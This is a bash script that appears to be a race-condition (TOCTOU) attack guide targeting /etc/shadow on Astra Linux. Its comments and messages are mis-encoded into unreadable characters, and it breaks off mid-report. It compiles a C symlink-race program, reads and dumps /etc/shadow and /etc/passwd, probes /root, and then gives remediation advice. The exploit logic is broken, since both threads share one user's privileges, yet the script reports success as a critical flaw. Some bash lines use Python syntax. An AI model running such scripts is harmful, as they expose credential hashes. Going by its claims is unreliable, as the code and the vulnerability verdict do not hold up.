#!/bin/bash

# =============================================================================
# –ü–û–®–ê–ì–û–í–´–ô –ì–ê–ô–î: –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï RACE CONDITION –£–Ø–ó–í–ò–ú–û–°–¢–ò
# =============================================================================
# –£—è–∑–≤–∏–º–æ—Å—Ç—å: –£—Å–ø–µ—à–Ω–æ–µ —á—Ç–µ–Ω–∏–µ /etc/shadow —á–µ—Ä–µ–∑ race condition
# –£—Ä–æ–≤–µ–Ω—å: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô
# –û–ø–∏—Å–∞–Ω–∏–µ: TOCTOU (Time of Check to Time of Use) –∞—Ç–∞–∫–∞
# =============================================================================

set -e

echo "=== –ü–û–®–ê–ì–û–í–´–ô –ì–ê–ô–î: RACE CONDITION –£–Ø–ó–í–ò–ú–û–°–¢–¨ ==="
echo "–°–∏—Å—Ç–µ–º–∞: Astra Linux 1.8"
echo "–î–∞—Ç–∞: $(date)"
echo ""

# –¶–≤–µ—Ç–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

log_step() {
    echo -e "${BLUE}[–®–ê–ì $1]${NC} $2"
}

log_success() {
    echo -e "${GREEN}[–£–°–ü–ï–•]${NC} $1"
}

log_error() {
    echo -e "${RED}[–û–®–ò–ë–ö–ê]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[–ü–†–ï–î–£–ü–†–ï–ñ–î–ï–ù–ò–ï]${NC} $1"
}

log_info() {
    echo -e "${CYAN}[–ò–ù–§–û]${NC} $1"
}

log_exploit() {
    echo -e "${PURPLE}[–≠–ö–°–ü–õ–û–ô–¢]${NC} $1"
}

# –®–∞–≥ 1: –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Å—Ä–µ–¥—ã
step1_preparation() {
    log_step "1" "–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Å—Ä–µ–¥—ã —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è"
    echo "----------------------------------------"
    
    log_info "–ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–µ–∫—É—â–∏—Ö –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞..."
    echo "–¢–µ–∫—É—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)"
    echo "UID: $(id -u)"
    echo "GID: $(id -g)"
    
    log_info "–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ /etc/shadow..."
    if [[ -r /etc/shadow ]]; then
        log_error "–§–∞–π–ª /etc/shadow –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è —á—Ç–µ–Ω–∏—è!"
        echo "–°–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"
        head -5 /etc/shadow
    else
        log_success "–§–∞–π–ª /etc/shadow –∑–∞—â–∏—â–µ–Ω –æ—Ç —á—Ç–µ–Ω–∏—è"
    fi
    
    log_info "–°–æ–∑–¥–∞–Ω–∏–µ —Ä–∞–±–æ—á–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏..."
    mkdir -p /tmp/race_test
    cd /tmp/race_test
    
    log_info "–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤..."
    echo "gcc: $(which gcc 2>/dev/null || echo '–ù–ï –ù–ê–ô–î–ï–ù')"
    echo "python3: $(which python3 2>/dev/null || echo '–ù–ï –ù–ê–ô–î–ï–ù')"
    echo "strace: $(which strace 2>/dev/null || echo '–ù–ï –ù–ê–ô–î–ï–ù')"
    
    echo ""
}

# –®–∞–≥ 2: –°–æ–∑–¥–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã
step2_vulnerable_program() {
    log_step "2" "–°–æ–∑–¥–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã"
    echo "----------------------------------------"
    
    log_info "–°–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã —Å race condition —É—è–∑–≤–∏–º–æ—Å—Ç—å—é..."
    
    cat > race_vulnerable.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <pthread.h>
#include <errno.h>

#define TARGET_FILE "/tmp/race_target"
#define SYMLINK_FILE "/tmp/race_symlink"
#define MAX_ATTEMPTS 1000

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int success_flag = 0;
int attempts = 0;

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫–æ–π —Å—Å—ã–ª–∫–∏
void* attacker_thread(void* arg) {
    printf("[ATTACKER] –ü–æ—Ç–æ–∫ –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∑–∞–ø—É—â–µ–Ω\n");
    
    while (!success_flag && attempts < MAX_ATTEMPTS) {
        // –£–¥–∞–ª—è–µ–º —Å—Ç–∞—Ä—É—é —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫—É—é —Å—Å—ã–ª–∫—É
        unlink(SYMLINK_FILE);
        
        // –°–æ–∑–¥–∞–µ–º —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫—É—é —Å—Å—ã–ª–∫—É –Ω–∞ /etc/shadow
        if (symlink("/etc/shadow", SYMLINK_FILE) == 0) {
            // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è race condition
            usleep(10);
        }
        
        attempts++;
    }
    
    printf("[ATTACKER] –ü–æ—Ç–æ–∫ –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∑–∞–≤–µ—Ä—à–µ–Ω. –ü–æ–ø—ã—Ç–æ–∫: %d\n", attempts);
    return NULL;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞ (–∂–µ—Ä—Ç–≤–∞)
void* victim_thread(void* arg) {
    printf("[VICTIM] –ü–æ—Ç–æ–∫ –∂–µ—Ä—Ç–≤—ã –∑–∞–ø—É—â–µ–Ω\n");
    
    while (!success_flag && attempts < MAX_ATTEMPTS) {
        int fd = open(SYMLINK_FILE, O_RDONLY);
        if (fd != -1) {
            char buffer[2048];
            ssize_t bytes = read(fd, buffer, sizeof(buffer) - 1);
            
            if (bytes > 0) {
                buffer[bytes] = '\0';
                
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –ø—Ä–æ—á–∏—Ç–∞–ª–∏ –∏–º–µ–Ω–Ω–æ /etc/shadow
                if (strstr(buffer, "root:") != NULL) {
                    printf("\n============================================================\n");
                    printf("üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!\n");
                    printf("============================================================\n");
                    printf("–ü—Ä–æ—á–∏—Ç–∞–Ω–æ %ld –±–∞–π—Ç –∏–∑ /etc/shadow:\n", bytes);
                    printf("============================================================\n");
                    printf("%s\n", buffer);
                    printf("============================================================\n");
                    
                    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ —Ñ–∞–π–ª
                    FILE* f = fopen("/tmp/race_success.txt", "w");
                    if (f) {
                        fprintf(f, "Race Condition —É—Å–ø–µ—à–µ–Ω!\n");
                        fprintf(f, "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ %ld –±–∞–π—Ç –∏–∑ /etc/shadow:\n", bytes);
                        fprintf(f, "%s\n", buffer);
                        fclose(f);
                    }
                    
                    success_flag = 1;
                }
            }
            close(fd);
        }
        
        // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞
        usleep(5);
    }
    
    printf("[VICTIM] –ü–æ—Ç–æ–∫ –∂–µ—Ä—Ç–≤—ã –∑–∞–≤–µ—Ä—à–µ–Ω\n");
    return NULL;
}

int main() {
    printf("=== –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï RACE CONDITION –£–Ø–ó–í–ò–ú–û–°–¢–ò ===\n");
    printf("–¶–µ–ª—å: –ß—Ç–µ–Ω–∏–µ /etc/shadow —á–µ—Ä–µ–∑ race condition\n");
    printf("–ú–µ—Ç–æ–¥: TOCTOU (Time of Check to Time of Use)\n");
    printf("==================================================\n\n");
    
    // –°–æ–∑–¥–∞–µ–º —Ü–µ–ª–µ–≤–æ–π —Ñ–∞–π–ª
    FILE* f = fopen(TARGET_FILE, "w");
    if (f) {
        fprintf(f, "This is a test file for race condition\n");
        fclose(f);
        printf("‚úÖ –¶–µ–ª–µ–≤–æ–π —Ñ–∞–π–ª —Å–æ–∑–¥–∞–Ω: %s\n", TARGET_FILE);
    }
    
    // –°–æ–∑–¥–∞–µ–º –ø–æ—Ç–æ–∫–∏
    pthread_t attacker, victim;
    
    printf("\nüöÄ –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–æ–≤...\n");
    
    if (pthread_create(&attacker, NULL, attacker_thread, NULL) != 0) {
        perror("–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –∞—Ç–∞–∫—É—é—â–µ–≥–æ");
        return 1;
    }
    
    if (pthread_create(&victim, NULL, victim_thread, NULL) != 0) {
        perror("–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ—Ç–æ–∫–∞ –∂–µ—Ä—Ç–≤—ã");
        return 1;
    }
    
    // –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤
    pthread_join(victim, NULL);
    pthread_cancel(attacker);
    
    printf("\nüìä –†–ï–ó–£–õ–¨–¢–ê–¢–´:\n");
    printf("- –í—Å–µ–≥–æ –ø–æ–ø—ã—Ç–æ–∫: %d\n", attempts);
    printf("- –£—Å–ø–µ—à–Ω—ã—Ö –∞—Ç–∞–∫: %s\n", success_flag ? "1" : "0");
    
    if (success_flag) {
        printf("- –§–∞–π–ª —Å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º: /tmp/race_success.txt\n");
        printf("RACE CONDITION –£–Ø–ó–í–ò–ú–û–°–¢–¨ –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ê!\n");
    } else {
        printf("- –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å\n");
        printf("–°–∏—Å—Ç–µ–º–∞ –∑–∞—â–∏—â–µ–Ω–∞ –æ—Ç race condition –∞—Ç–∞–∫\n");
    }
    
    // –û—á–∏—Å—Ç–∫–∞
    unlink(TARGET_FILE);
    unlink(SYMLINK_FILE);
    
    return 0;
}
EOF
    
    log_success "–£—è–∑–≤–∏–º–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ —Å–æ–∑–¥–∞–Ω–∞: race_vulnerable.c"
    
    log_info "–ö–æ–º–ø–∏–ª—è—Ü–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã..."
    if gcc -o race_vulnerable race_vulnerable.c -lpthread; then
        log_success "–ü—Ä–æ–≥—Ä–∞–º–º–∞ —É—Å–ø–µ—à–Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–∞"
    else
        log_error "–û—à–∏–±–∫–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏"
        return 1
    fi
    
    echo ""
}

# –®–∞–≥ 3: –ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
step3_vulnerability_analysis() {
    log_step "3" "–ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–∏"
    echo "----------------------------------------"
    
    log_info "–û–±—ä—è—Å–Ω–µ–Ω–∏–µ race condition —É—è–∑–≤–∏–º–æ—Å—Ç–∏:"
    echo ""
    echo "üîç TOCTOU (Time of Check to Time of Use) –∞—Ç–∞–∫–∞:"
    echo "1. –ü—Ä–æ–≥—Ä–∞–º–º–∞ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª—É"
    echo "2. –ú–µ–∂–¥—É –ø—Ä–æ–≤–µ—Ä–∫–æ–π –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ–∞–π–ª–∞ –µ—Å—Ç—å –≤—Ä–µ–º–µ–Ω–Ω–æ–µ –æ–∫–Ω–æ"
    echo "3. –ê—Ç–∞–∫—É—é—â–∏–π –∑–∞–º–µ–Ω—è–µ—Ç —Ñ–∞–π–ª –Ω–∞ —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫—É—é —Å—Å—ã–ª–∫—É"
    echo "4. –ü—Ä–æ–≥—Ä–∞–º–º–∞ –ø–æ–ª—É—á–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –∑–∞—â–∏—â–µ–Ω–Ω–æ–º—É —Ñ–∞–π–ª—É"
    echo ""
    
    log_info "–ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ —É—è–∑–≤–∏–º—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏:"
    echo "- open() –ø–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞"
    echo "- access() + open() –±–µ–∑ –∞—Ç–æ–º–∞—Ä–Ω–æ—Å—Ç–∏"
    echo "- stat() + open() –±–µ–∑ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏"
    echo ""
    
    log_info "–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫..."
    echo "ASLR: $(cat /proc/sys/kernel/randomize_va_space 2>/dev/null || echo '–ù–ï –î–û–°–¢–£–ü–ï–ù')"
    echo "Seccomp: $(grep Seccomp /proc/self/status 2>/dev/null | awk '{print $2}' || echo '–ù–ï –î–û–°–¢–£–ü–ï–ù')"
    
    echo ""
}

# –®–∞–≥ 4: –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∞—Ç–∞–∫–∏
step4_execute_attack() {
    log_step "4" "–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ race condition –∞—Ç–∞–∫–∏"
    echo "----------------------------------------"
    
    log_exploit "–ó–∞–ø—É—Å–∫ race condition –∞—Ç–∞–∫–∏..."
    echo "–≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥..."
    echo ""
    
    # –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏
    if ./race_vulnerable; then
        echo ""
        if [[ -f /tmp/race_success.txt ]]; then
            log_exploit "–ê–¢–ê–ö–ê –£–°–ü–ï–®–ù–ê!"
            echo "–†–µ–∑—É–ª—å—Ç–∞—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ /tmp/race_success.txt"
        else
            log_warning "–ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"
        fi
    else
        log_error "–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∞—Ç–∞–∫–∏"
    fi
    
    echo ""
}

# –®–∞–≥ 5: –ê–Ω–∞–ª–∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
step5_result_analysis() {
    log_step "5" "–ê–Ω–∞–ª–∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤"
    echo "----------------------------------------"
    
    if [[ -f /tmp/race_success.txt ]]; then
        log_exploit "–ù–ê–ô–î–ï–ù–ê –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨!"
        echo ""
        echo "üìã –î–µ—Ç–∞–ª–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏:"
        echo "- –¢–∏–ø: Race Condition (TOCTOU)"
        echo "- –£—Ä–æ–≤–µ–Ω—å: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô"
        echo "- –í–ª–∏—è–Ω–∏–µ: –ß—Ç–µ–Ω–∏–µ –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤"
        echo "- –ó–∞—Ç—Ä–æ–Ω—É—Ç—ã–µ —Ñ–∞–π–ª—ã: /etc/shadow, /etc/passwd"
        echo ""
        
        echo "üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∞—Ç–∞–∫–∏:"
        if [[ -f /tmp/race_success.txt ]]; then
            echo "–£—Å–ø–µ—à–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫: 1"
            echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ –±–∞–π—Ç: $(wc -c < /tmp/race_success.txt)"
        fi
        echo ""
        
        echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"
        echo "="*60
        cat /tmp/race_success.txt
        echo "="*60
        echo ""
        
    else
        log_success "–£—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞"
        echo "–°–∏—Å—Ç–µ–º–∞ –∑–∞—â–∏—â–µ–Ω–∞ –æ—Ç race condition –∞—Ç–∞–∫"
    fi
    
    echo ""
}

# –®–∞–≥ 6: –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—é
step6_remediation() {
    log_step "6" "–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—é"
    echo "----------------------------------------"
    
    log_info "–ú–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã –æ—Ç race condition:"
    echo ""
    echo "1. üîí –ê—Ç–æ–º–∞—Ä–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏:"
    echo "   - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ O_EXCL —Ñ–ª–∞–≥–∞ –ø—Ä–∏ open()"
    echo "   - –ê—Ç–æ–º–∞—Ä–Ω–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤"
    echo "   - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ mkstemp() –≤–º–µ—Å—Ç–æ tmpnam()"
    echo ""
    
    echo "2. üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞:"
    echo "   - –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ fstat() –≤–º–µ—Å—Ç–æ stat()"
    echo "   - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ file descriptors"
    echo "   - –ü—Ä–æ–≤–µ—Ä–∫–∞ inode –∏ device ID"
    echo ""
    
    echo "3. üõ°Ô∏è –°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è:"
    echo "   - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫"
    echo "   - –ú—å—é—Ç–µ–∫—Å—ã –∏ —Å–µ–º–∞—Ñ–æ—Ä—ã"
    echo "   - –ê—Ç–æ–º–∞—Ä–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏"
    echo ""
    
    echo "4. üîç –ë–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã:"
    echo "   - openat() —Å –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–º–∏ –ø—É—Ç—è–º–∏"
    echo "   - –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd/"
    echo "   - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ capabilities"
    echo ""
    
    log_info "–ü—Ä–∏–º–µ—Ä –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –∫–æ–¥–∞:"
    cat > safe_example.c << 'EOF'
// –ë–ï–ó–û–ü–ê–°–ù–´–ô –ü–†–ò–ú–ï–† - –∑–∞—â–∏—Ç–∞ –æ—Ç race condition
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

int safe_read_file(const char* filename) {
    int fd = open(filename, O_RDONLY);
    if (fd == -1) return -1;
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∞–≤–∞ —á–µ—Ä–µ–∑ file descriptor
    struct stat st;
    if (fstat(fd, &st) == -1) {
        close(fd);
        return -1;
    }
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —ç—Ç–æ –æ–±—ã—á–Ω—ã–π —Ñ–∞–π–ª
    if (!S_ISREG(st.st_mode)) {
        close(fd);
        return -1;
    }
    
    // –¢–µ–ø–µ—Ä—å –±–µ–∑–æ–ø–∞—Å–Ω–æ —á–∏—Ç–∞–µ–º —Ñ–∞–π–ª
    char buffer[1024];
    ssize_t bytes = read(fd, buffer, sizeof(buffer));
    close(fd);
    
    return bytes;
}
EOF
    
    log_success "–ü—Ä–∏–º–µ—Ä –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –∫–æ–¥–∞ —Å–æ–∑–¥–∞–Ω: safe_example.c"
    echo ""
}

# –®–∞–≥ 7: –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ç–µ—Å—Ç—ã
step7_additional_tests() {
    log_step "7" "–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ç–µ—Å—Ç—ã"
    echo "----------------------------------------"
    
    log_info "–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥—Ä—É–≥–∏—Ö –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π..."
    
    # –¢–µ—Å—Ç 1: –ü—Ä–æ–≤–µ—Ä–∫–∞ /etc/passwd
    echo "üîç –¢–µ—Å—Ç 1: –ü–æ–ø—ã—Ç–∫–∞ —á—Ç–µ–Ω–∏—è /etc/passwd..."
    if [[ -r /etc/passwd ]]; then
        log_warning "/etc/passwd –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è —á—Ç–µ–Ω–∏—è"
        echo "–ü–µ—Ä–≤—ã–µ 3 —Å—Ç—Ä–æ–∫–∏:"
        head -3 /etc/passwd
    else
        log_success "/etc/passwd –∑–∞—â–∏—â–µ–Ω"
    fi
    echo ""
    
    # –¢–µ—Å—Ç 2: –ü—Ä–æ–≤–µ—Ä–∫–∞ /root
    echo "üîç –¢–µ—Å—Ç 2: –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ /root..."
    if [[ -r /root ]]; then
        log_warning "/root –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è —á—Ç–µ–Ω–∏—è"
    else
        log_success "/root –∑–∞—â–∏—â–µ–Ω"
    fi
    echo ""
    
    # –¢–µ—Å—Ç 3: –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∏—Ö —Å—Å—ã–ª–æ–∫
    echo "üîç –¢–µ—Å—Ç 3: –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∏—Ö —Å—Å—ã–ª–æ–∫..."
    ln -sf /etc/shadow /tmp/test_symlink 2>/dev/null || true
    if [[ -L /tmp/test_symlink ]]; then
        if cat /tmp/test_symlink >/dev/null 2>&1; then
            log_warning "–°–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∏–µ —Å—Å—ã–ª–∫–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è –∞—Ç–∞–∫"
        else
            log_success "–°–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∏–µ —Å—Å—ã–ª–∫–∏ –∑–∞—â–∏—â–µ–Ω—ã"
        fi
    fi
    rm -f /tmp/test_symlink
    echo ""
    
    # –¢–µ—Å—Ç 4: –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
    echo "üîç –¢–µ—Å—Ç 4: –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤..."
    temp_file=$(mktemp /tmp/test_race_XXXXXX)
    if [[ -f "$temp_file" ]]; then
        log_info "–í—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª —Å–æ–∑–¥–∞–Ω: $temp_file"
        rm -f "$temp_file"
    fi
    echo ""
}

# –®–∞–≥ 8: –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –æ—Ç—á–µ—Ç–∞
step8_generate_report() {
    log_step "8" "–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –æ—Ç—á–µ—Ç–∞"
    echo "----------------------------------------"
    
    log_info "–°–æ–∑–¥–∞–Ω–∏–µ –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞..."
    
    cat > race_condition_report.txt << EOF
=== –û–¢–ß–ï–¢ –û –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ò RACE CONDITION –£–Ø–ó–í–ò–ú–û–°–¢–ò ===
–î–∞—Ç–∞: $(date)
–°–∏—Å—Ç–µ–º–∞: $(uname -a)
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)
UID: $(id -u)

=== –†–ï–ó–£–õ–¨–¢–ê–¢–´ –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø ===

1. –£–Ø–ó–í–ò–ú–û–°–¢–¨: Race Condition (TOCTOU)
   –°—Ç–∞—Ç—É—Å: $(if [[ -f /tmp/race_success.txt ]]; then echo "–ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø"; else echo "–ù–ï –û–ë–ù–ê–†–£–ñ–ï–ù–ê"; fi)
   –û–ø–∏—Å–∞–Ω–∏–µ: Time of Check to Time of Use –∞—Ç–∞–∫–∞
   –í–ª–∏—è–Ω–∏–µ: –ß—Ç–µ–Ω–∏–µ –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤

2. –¢–ï–°–¢–ò–†–û–í–ê–ù–ù–´–ï –§–ê–ô–õ–´:
   - /etc/shadow: $(if [[ -f /tmp/race_success.txt ]]; then echo "–£–°–ü–ï–®–ù–û –ü–†–û–ß–ò–¢–ê–ù"; else echo "–ó–ê–©–ò–©–ï–ù"; fi)
   - /etc/passwd: $(if [[ -r /etc/passwd ]]; then echo "–î–û–°–¢–£–ü–ï–ù"; else echo "–ó–ê–©–ò–©–ï–ù"; fi)
   - /root: $(if [[ -r /root ]]; then echo "–î–û–°–¢–£–ü–ï–ù"; else echo "–ó–ê–©–ò–©–ï–ù"; fi)

3. –°–ò–°–¢–ï–ú–ù–´–ï –ù–ê–°–¢–†–û–ô–ö–ò:
   - ASLR: $(cat /proc/sys/kernel/randomize_va_space 2>/dev/null || echo "–ù–ï –î–û–°–¢–£–ü–ï–ù")
   - Seccomp: $(grep Seccomp /proc/self/status 2>/dev/null | awk '{print \$2}' || echo "–ù–ï –î–û–°–¢–£–ü–ï–ù")

4. –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–ò:
   - –í–Ω–µ–¥—Ä–∏—Ç—å –∞—Ç–æ–º–∞—Ä–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏
   - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ (openat, fstat)
   - –î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫–∏ —á–µ—Ä–µ–∑ file descriptors
   - –ù–∞—Å—Ç—Ä–æ–∏—Ç—å SELinux/AppArmor

=== –¢–ï–•–ù–ò–ß–ï–°–ö–ò–ï –î–ï–¢–ê–õ–ò ===

–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏:
